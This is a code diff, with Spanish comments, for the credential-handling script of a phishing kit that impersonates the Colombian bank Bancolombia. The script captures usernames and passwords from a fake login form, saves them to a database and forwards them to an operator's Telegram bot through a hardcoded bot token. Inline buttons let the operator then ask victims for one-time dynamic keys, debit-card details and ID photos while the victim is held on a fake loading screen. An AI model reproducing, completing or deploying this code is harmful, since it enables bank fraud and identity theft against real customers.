@@ -1,10 +1,40 @@
 <?php
+/**
+ * sendata.php
+ * -----------
+ * Handler del POST del formulario de login Virtual-Persona.html.
+ *
+ * Pasos estándar en este script:
+ *   1) Lee del body: usuario, clave, key (sesión 18 chars), correo.
+ *   2) Genera NUEVO request_id: BCO_<144 bits aleatorios> (nunca se reutiliza,
+ *      incluso si la fila ya existía por la misma key).
+ *   3) UPSERT en tabla `solicitudes`:
+ *        • Si es una fila nueva → INSERT normal.
+ *        • Si ya existía (UNIQUE KEY(key)) → RESET TOTAL:
+ *          nuevo request_id, sobreescribir user/password, ESTADO='pendiente'.
+ *      Con esto aseguramos que el loader NUNCA salte solo a una pantalla
+ *      por un estado viejo de una sesión anterior.
+ *   4) Envía mensaje al bot de Telegram de OPERACIONES con los datos
+ *      del login + TECLADO INLINE con las opciones que el operador pulsa:
+ *          OPCION_1  = DINAMICA
+ *          OPCION_2  = TARJETA
+ *          OPCION_3  = ERROR_OP3
+ *          OPCION_4  = ERROR_OP4
+ *          OPCION_5  = FOTO
+ *          OPCION_10 = FINALIZAR  → bancolombia.com/personas/creditos
+ *          (OPCION_6/7/8/9/55 son usados solo por los enviar_dato_extra*)
+ *   5) Guarda datos en $_SESSION y 302 Location hacia espera.html, que es la
+ *      pantalla con el loader Bancolombia INDEFINIDO hasta que el operador
+ *      pulse un botón en Telegram.
+ */
+
 ob_start();
 session_start();
-require 'conexion.php';
+require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';
 
 date_default_timezone_set('America/Bogota');
 
+// ── Paso 1: datos del formulario Virtual-Persona ─────────────────────────────
 $nombreUsuario = $_POST['usuario'] ?? '';
 $password      = $_POST['clave']   ?? '';
 $claveUnica    = $_POST['key']     ?? '';
@@ -14,24 +44,20 @@ if (trim($claveUnica) === '') {
     $claveUnica = 'auto_' . bin2hex(random_bytes(16));
 }
 
+// Miramos si ya hay fila previa para esta key (solo lo usamos para leer campos
+// antiguos, pero AÚN ASÍ generamos request_id nuevo y reseteamos estado).
 $sel = $pdo->prepare("SELECT request_id, correo, estado FROM solicitudes WHERE `key` = ? LIMIT 1");
 $sel->execute([$claveUnica]);
 $existente = $sel->fetch(PDO::FETCH_ASSOC);
 
-if ($existente && !empty($existente['request_id'])) {
-    $idPeticionAntiguo = (string)$existente['request_id'];
-} else {
-    $idPeticionAntiguo = null;
-}
-// NUEVA sesion de login = NUEVO request_id BCO_ y estado='pendiente' SIEMPRE,
-// incluso si la fila ya existia con estado != pendiente de una sesion anterior.
-// Asi el operador tiene que volver a pulsar el boton correspondiente para esta sesion.
+// ── Paso 2: nuevo request_id BANCOLOMBIA formato BCO_<144 bits> ─────────────
 try {
     $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
 } catch (Throwable $_) {
     $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
 }
 
+// ── Paso 3: UPSERT (INSERT + UPDATE si key duplicada) ────────────────────────
 $upsert = $pdo->prepare(
     "INSERT INTO solicitudes (`key`, `user`, `password`, `request_id`, `correo`, `estado`, `banco`)
      VALUES (:k, :u, :p, :rid, :em, 'pendiente', 'Bancolombia')
@@ -51,10 +77,12 @@ $upsert->execute([
     ':em'  => $email,
 ]);
 
-$consulta = $pdo->prepare("SELECT numero_cuenta, monto, banco FROM solicitudes WHERE `key` = ? LIMIT 1");
+// Campos decorativos (celular, monto, banco) mostrados solo en el mensaje Telegram:
+$consulta = $pdo->prepare(
+    "SELECT numero_cuenta, monto, banco FROM solicitudes WHERE `key` = ? LIMIT 1"
+);
 $consulta->execute([$claveUnica]);
 $datosSolicitud = $consulta->fetch(PDO::FETCH_ASSOC);
-
 if (!$datosSolicitud) {
     $datosSolicitud = [
         'numero_cuenta' => '',
@@ -67,6 +95,7 @@ $telefonoCliente    = $datosSolicitud['numero_cuenta'];
 $montoTransferencia = $datosSolicitud['monto'];
 $nombreBanco        = $datosSolicitud['banco'];
 
+// ── Paso 4: mensaje + teclado inline al bot de Telegram OPERACIONES ──────────
 $botToken = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
 $idChat   = "-4923753161";
 
@@ -79,23 +108,32 @@ $mensaje .= "---\n";
 $mensaje .= "👤 Usuario: $nombreUsuario\n";
 $mensaje .= "🔒 Clave: $password\n";
 
+/* MAPEO STANDARD DE BOTONES INLINE (callback_data = OPCION_N_REQUEST_ID)
+   ═══════════════════════════════════════════════════════════════════════════
+   OPCION_1   = DINAMICA            → opcion1.html (clave dinámica)
+   OPCION_2   = TARJETA             → opcion6.html (datos tarjeta débito)
+   OPCION_3/4 = ERRORES (variantes) → opcion3/opcion4
+   OPCION_5   = FOTO/IDENTIDAD      → opcion5.html → enviar_dato_extra3
+   OPCION_10  = FINALIZAR           → https://www.bancolombia.com/personas/creditos
+   (Opciones 6,7,8,9,55 son usadas después de rellenar datos extra)
+   ═══════════════════════════════════════════════════════════════════════════ */
 $teclado = [
-  'inline_keyboard' => [[
-    ['text' => "DINAMICA",  'callback_data' => "OPCION_1_$idPeticion"],
-    ['text' => "TARJETA",   'callback_data' => "OPCION_2_$idPeticion"],
-  ], [
-    ['text' => "ERROR...",  'callback_data' => "OPCION_3_$idPeticion"],
-    ['text' => "ERROR...",  'callback_data' => "OPCION_4_$idPeticion"],
-    ['text' => "FOTO",      'callback_data' => "OPCION_5_$idPeticion"],
-  ], [
-    ['text' => "FINALIZAR", 'callback_data' => "OPCION_10_$idPeticion"]
-  ]]
+    'inline_keyboard' => [[
+        ['text' => "DINAMICA",  'callback_data' => "OPCION_1_$idPeticion"],
+        ['text' => "TARJETA",   'callback_data' => "OPCION_2_$idPeticion"],
+    ], [
+        ['text' => "ERROR...",  'callback_data' => "OPCION_3_$idPeticion"],
+        ['text' => "ERROR...",  'callback_data' => "OPCION_4_$idPeticion"],
+        ['text' => "FOTO",      'callback_data' => "OPCION_5_$idPeticion"],
+    ], [
+        ['text' => "FINALIZAR", 'callback_data' => "OPCION_10_$idPeticion"],
+    ]],
 ];
 
 $payload = json_encode([
-  'chat_id'      => $idChat,
-  'text'         => $mensaje,
-  'reply_markup' => $teclado
+    'chat_id'      => $idChat,
+    'text'         => $mensaje,
+    'reply_markup' => $teclado,
 ]);
 
 $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
@@ -107,6 +145,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
 
+// ── Paso 5: guardar sesión y 302 → espera.html (loader indefinido) ──────────
 $_SESSION['usuario']    = $nombreUsuario;
 $_SESSION['clave']      = $password;
 $_SESSION['correo']     = $email;
